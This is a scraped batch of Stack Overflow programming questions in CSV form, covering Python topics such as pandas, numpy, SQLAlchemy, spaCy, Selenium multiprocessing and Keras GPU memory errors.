<p>But, what about <code>continue</code> statement? I tested it seems that the after the <code>continue</code> statement is reached, the <code>else</code> part will be executed. Is this true?? Here is a code example:</p>

<pre><code># when condition found and it's `true` then `else` part is executing :

edibles = [""ham"", ""spam"", ""eggs"",""nuts""]
for food in edibles:
    if food == ""spam"":
        print(""No more spam please!"")
        continue
    print(""Great, delicious "" + food)

else:
    print(""I am so glad: No spam!"")
print(""Finally, I finished stuffing myself"")`
</code></pre>

<p>If I remove ""spam"" from the list, now the condition is always <code>false</code> and never found but still the <code>else</code> part is executed:</p>

<pre><code>edibles = [""ham"",""eggs"",""nuts""]
for food in edibles:
    if food == ""spam"":
        print(""No more spam please!"")
        continue
    print(""Great, delicious "" + food)

else:
    print(""I am so glad: No spam!"")
print(""Finally, I finished stuffing myself"")
</code></pre>
"
39960754,6949525.0,2016-10-10 14:36:21+00:00,4,Python time function inconsistency,"<p>I've been gave an assignment were i had to create two small functions that gives, with equal chance, ""heads"" or ""tails"" and, similary with a 6 faces thrown dice, 1,2,3,4,5 or 6.</p>

<p>Important: I could NOT use randint or similar functions for this assignment.</p>

<p>So i've created those two functions that generate a 'pseudo-random number' utilizing time (first digit of the milliseconds) function from python library:</p>

<pre><code>import time

def dice():
    ctrl = False
    while ctrl == False:
            m = lambda: int(round(time.time() * 1000))
            f = m()
            d = abs(f) % 10
            if d in range(1,7):
                    return d
                    ctrl = True


def coin():
        m = lambda: int(round(time.time() * 1000))
        f = m()
        if f % 2 == 0:
                return ""Tails""
        elif f == 0:
                return ""Tails""
        else:
                return ""Heads"" (EDIT: I don't know why i typed ""Dimes"" before)
</code></pre>

<p>However i've observed a tendency to give 'Tails' over 'Heads', so i've created an function to test the percentage of 'Tails' and 'Heads' in 100 throws:</p>

<pre><code>def _test():
    ta = 0
    he = 0
    x = 100
    while x &gt; 0:
        c = coin()
        if c == ""Tails"":
            ta += 1
        else:
            he += 1
    x -= 1
    time.sleep(0.001)
print(""Tails:%s Heads:%s"" % (ta, he))
</code></pre>

<p>The result of the test was (for several times):</p>

<pre><code>Tails:56 Heads:44
</code></pre>

<p>So i did the same thing with the dice function and the result was:</p>

<pre><code>1:20 2:20 3:10 4:20 5:10 6:20
</code></pre>

<p>So, as you can see, for some reason i could not infer - if it is by some mistake of my or some other reason - the time function has a tendency to give less '3' and '5', and running the test again with all the numbers (zeros, sevens, eights and nines included) i've come to see that this tendency extends to '0' and '7'.</p>

<p>I would be grateful for some insight and opinions on the matter.</p>

<p>EDIT:</p>

<p>Remove the round() function from the <code>m = lambda: int(round(time.time() * 1000))</code> function solved the problem - as answered by Makoto.</p>
"
39902832,4665272.0,2016-10-06 18:05:02+00:00,4,Python to CSV is splitting string into two columns when I want one,"<p>I am scraping a page with BeautifulSoup, and part of the logic is that sometimes part of the contents of a <code>&lt;td&gt;</code> tag can have a <code>&lt;br&gt;</code> in it.  </p>

<p>So sometimes it looks like this:</p>

<pre class=""lang-html prettyprint-override""><code>&lt;td class=""xyz""&gt;
    text 1
    &lt;br&gt;
    text 2
&lt;/td&gt;
</code></pre>

<p>and sometimes it looks like this:</p>

<pre class=""lang-html prettyprint-override""><code>&lt;td class=""xyz""&gt;
    text 1
&lt;/td&gt;
</code></pre>

<p>I am looping through this and adding to an output_row list that I eventually add to a list of lists.  Whether I see the former format or the latter, I want the text to be in one cell.  </p>

<p>I've found a way to determine if I am seeing the <code>&lt;br&gt;</code> tag because the td.string shows up as none and I also know that text 2 always has 'ABC' in it.  So:</p>

<pre class=""lang-python prettyprint-override""><code>    elif td.string == None:
        if 'ABC' in td.contents[2]:
            new_string = td.contents[0] + ' ' + td.contents[2]
            output_row.append(new_string)
            print(new_string)
        else:    
            #this is for another situation and it works fine
</code></pre>

<p>As I print this in a Jupyter Notebook, it shows up as ""text 1 text 2"" as one line.  But when I open up my CSV, it is in two different columns.  So when td.string has contents (meaning no <code>&lt;br&gt;</code> tag), text 1 shows up in one column, but when I get to the pieces that have a <code>&lt;br&gt;</code> tag, all my data gets shifted.  </p>

<p>I'm not sure why it shows up as two different strings (two columns) when I concatenate them before appending them to the list.  </p>

<p>I'm writing to file like this:</p>

<pre class=""lang-python prettyprint-override""><code>with open('C:/location/file.csv', 'w',newline='') as csv_file:
    writer=csv.writer(csv_file,delimiter=',')
    #writer.writerow(headers)
    for row in output_rows:
        writer.writerow(row)

csv_file.close
</code></pre>
"
39824273,4107770.0,2016-10-03 03:36:18+00:00,4,Multiprocessing and Selenium Python,"<p>I have 3 drivers (Firefox browsers) and I want them to <code>do something</code> in a list of websites.</p>

<p>I have a worker defined as:</p>

<pre><code>def worker(browser, queue):
    while True:
        id_ = queue.get(True)
        obj = ReviewID(id_)
        obj.search(browser)
        if obj.exists(browser):
            print(obj.get_url(browser))
        else:
            print(""Nothing"")
</code></pre>

<p>So the worker will just acces to a queue that contains the ids and use the browser to do something.</p>

<p>I want to have a pool of workers so that as soon as a worker has finished using the browser to do something on the website defined by id_, then it immediately starts to work using the same browser to do something on the next id_ found in queue. I have then this:</p>

<pre><code>pool = Pool(processes=3)  # I want to have 3 drivers
manager = Manager()
queue = manager.Queue()
# Define here my workers in the pool
for id_ in ids:
    queue.put(id_)
for i in range(3):
    queue.put(None)
</code></pre>

<p>Here I have a problem, I don't know how to define my workers so that they are in the pool. To each driver I need to assign a worker, and all the workers share the same queue of ids. Is this possible? How can I do it?</p>

<p>Another idea that I have is to create a queue of browsers so that if a driver is doing nothing, it is taken by a worker, along with an id_ from the queue in order to perform a new process. But I'm completely new to multiprocessing and actually don't know how to write this.</p>

<p>I appreciate your help.</p>
"
39777348,3642398.0,2016-09-29 18:18:20+00:00,4,Possible to change directory and have change persist when script finishes?,"<p>In trying to answer <a href=""http://stackoverflow.com/q/39776616/3642398"">a question for another user</a>, I came across something that piqued my curiosity:</p>

<pre><code>import os
os.chdir('..')
</code></pre>

<p>Will change the working directory as far as Python is concerned, so if I am in <code>/home/username/</code>, and I run <code>os.chdir('..')</code>, any subsequent code will work as though I am in <code>/home/</code>. For example, if I then do:</p>

<pre><code>import glob
files = glob.glob('*.py')
</code></pre>

<p><code>files</code> will be a list of <code>.py</code> files in <code>/home/</code> rather than in <code>/home/username/</code>. However, as soon as the script exits, I will be back in <code>/home/username/</code>, or whichever directory I ran the script from originally.</p>

<p>I have found the same thing happens with shell scripts. If I have the following script:</p>

<pre><code>#!/bin/bash

cd /tmp
touch foo.txt
</code></pre>

<p>Running the script from <code>/home/username/</code> will create a file <code>foo.txt</code> in <code>/tmp/</code>, but when the script finishes, I will still be in <code>/home/username/</code> not <code>/tmp/</code>. </p>

<p>I am curious if there is some fundamental reason why the working directory is not changed ""permanently"" in these cases, and if there <em>is</em> a way to change it permanently, e.g., to run a script with <code>~$ python myscript.py</code>, and have the terminal that script was run from end up in a different directory when the script finishes executing. </p>
"
39890593,2698072.0,2016-10-06 07:57:20+00:00,4,AppEngine docs recommend command-line flags instead of app.yaml file elements,"<p>In the <a href=""https://cloud.google.com/appengine/docs/python/config/appref"" rel=""nofollow"">app.yaml</a> documentation, Google makes the following recommendation of number of times:</p>

<blockquote>
  <p>""The recommended approach is to remove the <strong>ELEMENT NAME</strong> [e.g. <code>application</code>] from your app.yaml file and instead, use a command-line flag to specify your <strong>ELEMENT NAME</strong> [e.g. <code>application ID</code>]""</p>
</blockquote>

<p>Unfortunately, Google doesn't explain why they recommend this.</p>

<p>In my opinion, an informative app.yaml file is much more helpful than deploying an app with command-line flags. Can anyone explain why Google makes this recommendation?</p>
"
39897333,5407682.0,2016-10-06 13:26:55+00:00,4,Python: If Condition then skip to return,"<p>I wondered if there is a nice way to tell the python interpreter to <strong>skip to the next/last return statement of a function</strong>.</p>

<p>Lets assume the following dummy code:</p>

<pre class=""lang-py prettyprint-override""><code>def foo(bar):
  do(stuff)

  if condition:
    do(stuff)
    if condition2:
      do(stuff)
      if condition3:
        ...

  return (...)
</code></pre>

<p>Sometimes this gets really messy with many conditions that i cant chain because they rely on on the block <code>do(stuff)</code> above. I could now do this:</p>

<pre class=""lang-py prettyprint-override""><code>def foo(bar):
  do(stuff)

  if not condition: return (...)
  do(stuff)
  if not condition2: return (...)
  do(stuff)
  if not condition3: return (...)
    ...

  return (...)
</code></pre>

<p>It looks a little less messy but i would have to repeat the return statement again and again which is somwhat anoying and if its a long tuple or similar it even looks worse.
The perfect solution would be to say ""if not condition, skip to the final return statement"". Is this somehow possible?</p>

<p><strong>edit:</strong> to make this clear: my goal is to improve readability while avoiding a drop in performance</p>
"
40121350,6439370.0,2016-10-19 02:58:12+00:00,4,str.replace function raise erorr that an integer is required,"<p>I wanna ask the problem I encountered. At first, 
Let me show you my whole code</p>

<pre><code>df1 = pd.read_excel(r'E:\ë´ë¼ë¬¸ìë£\ê³¨ëª©ìê¶ ë°ì´í°\ì´íìë¡ 54ê¸¸ ë´ì©ëºê±°.xlsx' , sheetname='first_day_datas')
df1.registerdate= df1.registerdate.astype(str) # ì¹¼ë¼ ìì± ë°ê¾¸ê¸°
df2 = pd.to_datetime(df1['registerdate'].str[0:10])
df3 = df2['registerdate'].str.replace('-', '').str.strip()
</code></pre>

<p>I just wanna change the string in registerdate column.
when I put print(df2.head(3)). It shows like below</p>

<pre><code>0   2016-10-11
1   2016-10-15
2   2016-10-15
</code></pre>

<p>so I wanna replace '-' with ''. 
I type the code and 'TypeError: an integer is required' popped out.
How can I solve this problem??</p>
"
39763091,5159284.0,2016-09-29 06:38:17+00:00,4,How to extract subjects in a sentence and their respective dependent phrases?,"<p>I am trying to work on subject extraction in a sentence, so that I can get the sentiments in accordance with the subject. I am using <code>nltk</code> in python2.7 for this purpose. Take the following sentence as an example:</p>

<p><code>Donald Trump is the worst president of USA, but Hillary is better than him</code></p>

<p>He we can see that <code>Donald Trump</code> and <code>Hillary</code> are the two subjects, and sentiments related to <code>Donald Trump</code> is negative but related to <code>Hillary</code> are positive. Till now, I am able to break this sentence into chunks of noun phrases, and I am able to get the following:</p>

<pre><code>(S
  (NP Donald/NNP Trump/NNP)
  is/VBZ
  (NP the/DT worst/JJS president/NN)
  in/IN
  (NP USA,/NNP)
  but/CC
  (NP Hillary/NNP)
  is/VBZ
  better/JJR
  than/IN
  (NP him/PRP))
</code></pre>

<p>Now, how do I approach in finding the subjects from these noun phrases? Then how do I group the phrases meant for both the subjects together? Once I have the <strong>phrases meant for both the subjects separately</strong>, I can perform sentiment analysis on both of them separately.</p>

<p><strong>EDIT</strong></p>

<p>I looked into the library mentioned by @Krzysiek (<code>spacy</code>), and it gave me dependency trees as well in the sentences. </p>

<p>Here is the code:</p>

<pre><code>from spacy.en import English
parser = English()

example = u""Donald Trump is the worst president of USA, but Hillary is better than him""
parsedEx = parser(example)
# shown as: original token, dependency tag, head word, left dependents, right dependents
for token in parsedEx:
    print(token.orth_, token.dep_, token.head.orth_, [t.orth_ for t in token.lefts], [t.orth_ for t in token.rights])
</code></pre>

<p>Here are the dependency trees:</p>

<pre><code>(u'Donald', u'compound', u'Trump', [], [])
(u'Trump', u'nsubj', u'is', [u'Donald'], [])
(u'is', u'ROOT', u'is', [u'Trump'], [u'president', u',', u'but', u'is'])
(u'the', u'det', u'president', [], [])
(u'worst', u'amod', u'president', [], [])
(u'president', u'attr', u'is', [u'the', u'worst'], [u'of'])
(u'of', u'prep', u'president', [], [u'USA'])
(u'USA', u'pobj', u'of', [], [])
(u',', u'punct', u'is', [], [])
(u'but', u'cc', u'is', [], [])
(u'Hillary', u'nsubj', u'is', [], [])
(u'is', u'conj', u'is', [u'Hillary'], [u'better'])
(u'better', u'acomp', u'is', [], [u'than'])
(u'than', u'prep', u'better', [], [u'him'])
(u'him', u'pobj', u'than', [], [])
</code></pre>

<p>This gives in depth insights into the dependencies of the different tokens of the sentences. Here is the <a href=""http://www.mathcs.emory.edu/~choi/doc/clear-dependency-2012.pdf"" rel=""nofollow"">link</a> to the paper which describes the dependencies between different pairs.  How can I use this tree to attach the contextual words for different subjects to them?</p>
"
39900208,2229219.0,2016-10-06 15:36:49+00:00,4,How to get unique rows and their occurrences for 2D array?,"<p>I have a 2D array, and it has some duplicate columns. I would like to be able to see which unique columns there are, and where the duplicates are.</p>

<p>My own array is too large to put here, but here is an example:</p>

<pre><code>a = np.array([[ 1.,  0.,  0.,  0.,  0.],[ 2.,  0.,  4.,  3.,  0.],])
</code></pre>

<p>This has the unique column vectors <code>[1.,2.]</code>, <code>[0.,0.]</code>, <code>[0.,4.]</code> and <code>[0.,3.]</code>. There is one duplicate: <code>[0.,0.]</code> appears twice.</p>

<p>Now I found a way to get the unique vectors and their indices <a href=""http://stackoverflow.com/questions/16970982/find-unique-rows-in-numpy-array"">here</a> but it is not clear to me how I would get the occurences of duplicates as well. I have tried several naive ways (with <code>np.where</code> and list comps) but those are all very very slow. Surely there has to be a numpythonic way?</p>

<p>In matlab it's just the <code>unique</code> function but <code>np.unique</code> flattens arrays.</p>
"
40083007,7030203.0,2016-10-17 09:39:05+00:00,4,Nesting a string inside a list n times ie list of a list of a list,"<pre><code>def nest(x, n):
    a = []
    for i in range(n):
        a.append([x])
    return a

print nest(""hello"", 5)
</code></pre>

<p>This gives an output</p>

<pre><code>[['hello'], ['hello'], ['hello'], ['hello'], ['hello']]
</code></pre>

<p>The desired output is </p>

<pre><code>[[[[[""hello""]]]]]
</code></pre>
"
39773560,2989320.0,2016-09-29 14:50:42+00:00,4,SQLAlchemy: How do you delete multiple rows without querying,"<p>I have a table that has millions of rows. I want to delete multiple rows via an in clause.  However, using the code:</p>

<pre><code>session.query(Users).filter(Users.id.in_(subquery....)).delete()
</code></pre>

<p>The above code will query the results, and then execute the delete.  I don't want to do that. I want speed.</p>

<p>I want to be able to execute (yes I know about the session.execute):<code>Delete from users where id in ()</code></p>

<p><strong>So the Question:</strong> How can I get the best of two worlds, using the ORM? Can I do the delete without hard coding the query?</p>
"
39766218,2336654.0,2016-09-29 09:15:53+00:00,4,How do I display floats as currency with negative sign before currency,"<p>consider the <code>pd.Series</code> <code>s</code></p>

<pre><code>s = pd.Series([-1.23, 4.56])
s

0   -1.23
1    4.56
dtype: float64
</code></pre>

<p>I can format floats with pandas <code>display.float_format</code> option</p>

<pre><code>with pd.option_context('display.float_format', '${:,.2f}'.format):
    print s

0   $-1.23
1    $4.56
dtype: float64
</code></pre>

<p>But how do I format it in such a way that I get the <code>-</code> sign in front of the <code>$</code></p>

<pre><code>0   -$1.23
1    $4.56
dtype: float64
</code></pre>
"
40099427,5337263.0,2016-10-18 04:17:57+00:00,4,python (deI) statement and python behavior,"<p>When a del statement is issued:</p>

<blockquote>
  <p>del var</p>
</blockquote>

<p>Shouldn't it be removed from the list of known variable and shouldn't the python interpreter spit out ""unresolved reference"" error?</p>

<p>Or is it simply just deleting the object and leaving the name (var) not pointing anywhere? Why would that kind of behavior be useful? In what cases?</p>

<p>Also I am talking simply about deleting a single variable. Not del list[3] or alike.</p>

<p>note: I am asking if this python's behavior is meant that way. And in what cases, it would be still useful.</p>

<p>EDIT: Charles Addis gave a detailed explanation. I also admit my mistake that I mistook the pycharm behavior as official python's. I am now trying out ipython along with official python interactive shell. Despite this being my mistake, I am glad that I learnt a lot about python variables along with some python debug commands.</p>
"
40120299,3450793.0,2016-10-19 00:46:19+00:00,4,Efficient way to select most recent index with finite value in column from Pandas DataFrame?,"<p>I'm trying to find the most recent index with a value that is not 'NaN' relative to the current index. So, say I have a DataFrame with 'NaN' values like this:</p>

<pre><code>       A       B       C
0    2.1     5.3     4.7
1    5.1     4.6     NaN
2    5.0     NaN     NaN
3    7.4     NaN     NaN
4    3.5     NaN     NaN
5    5.2     1.0     NaN
6    5.0     6.9     5.4
7    7.4     NaN     NaN
8    3.5     NaN     5.8
</code></pre>

<p>If I am currently at index 4, I have the values:</p>

<pre><code>       A       B       C
4    3.5     NaN     NaN
</code></pre>

<p>I want to know the last known value of 'B' relative to index 4, which is at index <code>1</code>:</p>

<pre><code>       A       B       C
1    5.1   -&gt; 4.6    NaN
</code></pre>

<p>I know I can get a list of all indexes with NaN values using something like:</p>

<pre><code>indexes = df.index[df['B'].apply(np.isnan)]
</code></pre>

<p>But this seems inefficient in a large database. Is there a way to <code>tail</code> just the last one relative to the current index?</p>
"
39890147,6930321.0,2016-10-06 07:34:16+00:00,4,"Keras uses way too much GPU memory when calling train_on_batch, fit, etc","<p>I've been messing with Keras, and like it so far. There's one big issue I have been having, when working with fairly deep networks: When calling model.train_on_batch, or model.fit etc., Keras allocates significantly more GPU memory than what the model itself should need. This is not caused by trying to train on some really large images, it's the network model itself that seems to require a lot of GPU memory. I have created this toy example to show what I mean. Here's essentially what's going on:</p>

<p>I first create a fairly deep network, and use model.summary() to get the total number of parameters needed for the network (in this case 206538153, which corresponds to about 826 MB). I then use nvidia-smi to see how much GPU memory Keras has allocated, and I can see that it makes perfect sense (849 MB).</p>

<p>I then compile the network, and can confirm that this does not increase GPU memory usage. And as we can see in this case, I have almost 1 GB of VRAM available at this point.</p>

<p>Then I try to feed a simple 16x16 image and a 1x1 ground truth to the network, and then everything blows up, because Keras starts allocating lots of memory again, for no reason that is obvious to me. Something about training the network seems to require a lot more memory than just having the model, which doesn't make sense to me. I have trained significantly deeper networks on this GPU in other frameworks, so that makes me think that I'm using Keras wrong (or there's something wrong in my setup, or in Keras, but of course that's hard to know for sure).</p>

<p>Here's the code:</p>

<pre><code>from scipy import misc
import numpy as np
from keras.models import Sequential
from keras.layers import Dense, Activation, Convolution2D, MaxPooling2D, Reshape, Flatten, ZeroPadding2D, Dropout
import os

model = Sequential()

model.add(Convolution2D(256, 3, 3, border_mode='same', input_shape=(16,16,1)))
model.add(MaxPooling2D(pool_size=(2,2), strides=(2,2)))
model.add(Convolution2D(512, 3, 3, border_mode='same'))
model.add(MaxPooling2D(pool_size=(2,2), strides=(2,2)))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(Convolution2D(1024, 3, 3, border_mode='same'))
model.add(MaxPooling2D(pool_size=(2,2), strides=(2,2)))
model.add(Convolution2D(256, 3, 3, border_mode='same'))
model.add(Convolution2D(32, 3, 3, border_mode='same'))
model.add(MaxPooling2D(pool_size=(2,2)))
model.add(Flatten())
model.add(Dense(4))
model.add(Dense(1))

model.summary()

os.system(""nvidia-smi"")
raw_input(""Press Enter to continue..."")    

model.compile(optimizer='sgd',
              loss='mse', 
              metrics=['accuracy'])

os.system(""nvidia-smi"")              
raw_input(""Compiled model. Press Enter to continue..."")

n_batches = 1
batch_size = 1
for ibatch in range(n_batches):
    x = np.random.rand(batch_size, 16,16,1)
    y = np.random.rand(batch_size, 1)

    os.system(""nvidia-smi"")
    raw_input(""About to train one iteration. Press Enter to continue..."")

    model.train_on_batch(x, y)         
    print(""Trained one iteration"")
</code></pre>

<p>Which gives the following output for me:</p>

<pre><code>Using Theano backend.
Using gpu device 0: GeForce GTX 960 (CNMeM is disabled, cuDNN 5103)
/usr/local/lib/python2.7/dist-packages/theano/sandbox/cuda/__init__.py:600: UserWarning: Your cuDNN version is more recent than the one Theano officially supports. If you see any problems, try updating Theano or downgrading cuDNN to version 5.
  warnings.warn(warn)
____________________________________________________________________________________________________
Layer (type)                     Output Shape          Param #     Connected to                     
====================================================================================================
convolution2d_1 (Convolution2D)  (None, 16, 16, 256)   2560        convolution2d_input_1[0][0]      
____________________________________________________________________________________________________
maxpooling2d_1 (MaxPooling2D)    (None, 8, 8, 256)     0           convolution2d_1[0][0]            
____________________________________________________________________________________________________
convolution2d_2 (Convolution2D)  (None, 8, 8, 512)     1180160     maxpooling2d_1[0][0]             
____________________________________________________________________________________________________
maxpooling2d_2 (MaxPooling2D)    (None, 4, 4, 512)     0           convolution2d_2[0][0]            
____________________________________________________________________________________________________
convolution2d_3 (Convolution2D)  (None, 4, 4, 1024)    4719616     maxpooling2d_2[0][0]             
____________________________________________________________________________________________________
convolution2d_4 (Convolution2D)  (None, 4, 4, 1024)    9438208     convolution2d_3[0][0]            
____________________________________________________________________________________________________
convolution2d_5 (Convolution2D)  (None, 4, 4, 1024)    9438208     convolution2d_4[0][0]            
____________________________________________________________________________________________________
convolution2d_6 (Convolution2D)  (None, 4, 4, 1024)    9438208     convolution2d_5[0][0]            
____________________________________________________________________________________________________
convolution2d_7 (Convolution2D)  (None, 4, 4, 1024)    9438208     convolution2d_6[0][0]            
____________________________________________________________________________________________________
convolution2d_8 (Convolution2D)  (None, 4, 4, 1024)    9438208     convolution2d_7[0][0]            
____________________________________________________________________________________________________
convolution2d_9 (Convolution2D)  (None, 4, 4, 1024)    9438208     convolution2d_8[0][0]            
____________________________________________________________________________________________________
convolution2d_10 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_9[0][0]            
____________________________________________________________________________________________________
convolution2d_11 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_10[0][0]           
____________________________________________________________________________________________________
convolution2d_12 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_11[0][0]           
____________________________________________________________________________________________________
convolution2d_13 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_12[0][0]           
____________________________________________________________________________________________________
convolution2d_14 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_13[0][0]           
____________________________________________________________________________________________________
convolution2d_15 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_14[0][0]           
____________________________________________________________________________________________________
convolution2d_16 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_15[0][0]           
____________________________________________________________________________________________________
convolution2d_17 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_16[0][0]           
____________________________________________________________________________________________________
convolution2d_18 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_17[0][0]           
____________________________________________________________________________________________________
convolution2d_19 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_18[0][0]           
____________________________________________________________________________________________________
convolution2d_20 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_19[0][0]           
____________________________________________________________________________________________________
convolution2d_21 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_20[0][0]           
____________________________________________________________________________________________________
convolution2d_22 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_21[0][0]           
____________________________________________________________________________________________________
convolution2d_23 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_22[0][0]           
____________________________________________________________________________________________________
convolution2d_24 (Convolution2D) (None, 4, 4, 1024)    9438208     convolution2d_23[0][0]           
____________________________________________________________________________________________________
maxpooling2d_3 (MaxPooling2D)    (None, 2, 2, 1024)    0           convolution2d_24[0][0]           
____________________________________________________________________________________________________
convolution2d_25 (Convolution2D) (None, 2, 2, 256)     2359552     maxpooling2d_3[0][0]             
____________________________________________________________________________________________________
convolution2d_26 (Convolution2D) (None, 2, 2, 32)      73760       convolution2d_25[0][0]           
____________________________________________________________________________________________________
maxpooling2d_4 (MaxPooling2D)    (None, 1, 1, 32)      0           convolution2d_26[0][0]           
____________________________________________________________________________________________________
flatten_1 (Flatten)              (None, 32)            0           maxpooling2d_4[0][0]             
____________________________________________________________________________________________________
dense_1 (Dense)                  (None, 4)             132         flatten_1[0][0]                  
____________________________________________________________________________________________________
dense_2 (Dense)                  (None, 1)             5           dense_1[0][0]                    
====================================================================================================
Total params: 206538153
____________________________________________________________________________________________________
None
Thu Oct  6 09:05:42 2016       
+------------------------------------------------------+                       
| NVIDIA-SMI 352.63     Driver Version: 352.63         |                       
|-------------------------------+----------------------+----------------------+
| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |
| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |
|===============================+======================+======================|
|   0  GeForce GTX 960     Off  | 0000:01:00.0      On |                  N/A |
| 30%   37C    P2    28W / 120W |   1082MiB /  2044MiB |      9%      Default |
+-------------------------------+----------------------+----------------------+

+-----------------------------------------------------------------------------+
| Processes:                                                       GPU Memory |
|  GPU       PID  Type  Process name                               Usage      |
|=============================================================================|
|    0      1796    G   /usr/bin/X                                     155MiB |
|    0      2597    G   compiz                                          65MiB |
|    0      5966    C   python                                         849MiB |
+-----------------------------------------------------------------------------+
Press Enter to continue...
Thu Oct  6 09:05:44 2016       
+------------------------------------------------------+                       
| NVIDIA-SMI 352.63     Driver Version: 352.63         |                       
|-------------------------------+----------------------+----------------------+
| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |
| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |
|===============================+======================+======================|
|   0  GeForce GTX 960     Off  | 0000:01:00.0      On |                  N/A |
| 30%   38C    P2    28W / 120W |   1082MiB /  2044MiB |      0%      Default |
+-------------------------------+----------------------+----------------------+

+-----------------------------------------------------------------------------+
| Processes:                                                       GPU Memory |
|  GPU       PID  Type  Process name                               Usage      |
|=============================================================================|
|    0      1796    G   /usr/bin/X                                     155MiB |
|    0      2597    G   compiz                                          65MiB |
|    0      5966    C   python                                         849MiB |
+-----------------------------------------------------------------------------+
Compiled model. Press Enter to continue...
Thu Oct  6 09:05:44 2016       
+------------------------------------------------------+                       
| NVIDIA-SMI 352.63     Driver Version: 352.63         |                       
|-------------------------------+----------------------+----------------------+
| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |
| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |
|===============================+======================+======================|
|   0  GeForce GTX 960     Off  | 0000:01:00.0      On |                  N/A |
| 30%   38C    P2    28W / 120W |   1082MiB /  2044MiB |      0%      Default |
+-------------------------------+----------------------+----------------------+

+-----------------------------------------------------------------------------+
| Processes:                                                       GPU Memory |
|  GPU       PID  Type  Process name                               Usage      |
|=============================================================================|
|    0      1796    G   /usr/bin/X                                     155MiB |
|    0      2597    G   compiz                                          65MiB |
|    0      5966    C   python                                         849MiB |
+-----------------------------------------------------------------------------+
About to train one iteration. Press Enter to continue...
Error allocating 37748736 bytes of device memory (out of memory). Driver report 34205696 bytes free and 2144010240 bytes total 
Traceback (most recent call last):
  File ""memtest.py"", line 65, in &lt;module&gt;
    model.train_on_batch(x, y)         
  File ""/usr/local/lib/python2.7/dist-packages/keras/models.py"", line 712, in train_on_batch
    class_weight=class_weight)
  File ""/usr/local/lib/python2.7/dist-packages/keras/engine/training.py"", line 1221, in train_on_batch
    outputs = self.train_function(ins)
  File ""/usr/local/lib/python2.7/dist-packages/keras/backend/theano_backend.py"", line 717, in __call__
    return self.function(*inputs)
  File ""/usr/local/lib/python2.7/dist-packages/theano/compile/function_module.py"", line 871, in __call__
    storage_map=getattr(self.fn, 'storage_map', None))
  File ""/usr/local/lib/python2.7/dist-packages/theano/gof/link.py"", line 314, in raise_with_op
    reraise(exc_type, exc_value, exc_trace)
  File ""/usr/local/lib/python2.7/dist-packages/theano/compile/function_module.py"", line 859, in __call__
    outputs = self.fn()
MemoryError: Error allocating 37748736 bytes of device memory (out of memory).
Apply node that caused the error: GpuContiguous(GpuDimShuffle{3,2,0,1}.0)
Toposort index: 338
Inputs types: [CudaNdarrayType(float32, 4D)]
Inputs shapes: [(1024, 1024, 3, 3)]
Inputs strides: [(1, 1024, 3145728, 1048576)]
Inputs values: ['not shown']
Outputs clients: [[GpuDnnConv{algo='small', inplace=True}(GpuContiguous.0, GpuContiguous.0, GpuAllocEmpty.0, GpuDnnConvDesc{border_mode='half', subsample=(1, 1), conv_mode='conv', precision='float32'}.0, Constant{1.0}, Constant{0.0}), GpuDnnConvGradI{algo='none', inplace=True}(GpuContiguous.0, GpuContiguous.0, GpuAllocEmpty.0, GpuDnnConvDesc{border_mode='half', subsample=(1, 1), conv_mode='conv', precision='float32'}.0, Constant{1.0}, Constant{0.0})]]

HINT: Re-running with most Theano optimization disabled could give you a back-trace of when this node was created. This can be done with by setting the Theano flag 'optimizer=fast_compile'. If that does not work, Theano optimizations can be disabled with 'optimizer=None'.
HINT: Use the Theano flag 'exception_verbosity=high' for a debugprint and storage map footprint of this apply node.
</code></pre>

<p>A few things to note: </p>

<ul>
<li>I have tried both Theano and TensorFlow backends. Both have the same problems, and run out of memory at the same line. In TensorFlow, it seems that Keras preallocates a lot of memory (about 1.5 GB) so nvidia-smi doesn't help us track what's going on there, but I get the same out-of-memory exceptions. Again, this points towards an error in (my usage of) Keras (although it's hard to be certain about such things, it could be something with my setup).</li>
<li>I tried using CNMEM in Theano, which behaves like TensorFlow: It preallocates a large amount of memory (about 1.5 GB) yet crashes in the same place.</li>
<li>There are some warnings about the CudNN-version. I tried running the Theano backend with CUDA but not CudNN and I got the same errors, so that is not the source of the problem.</li>
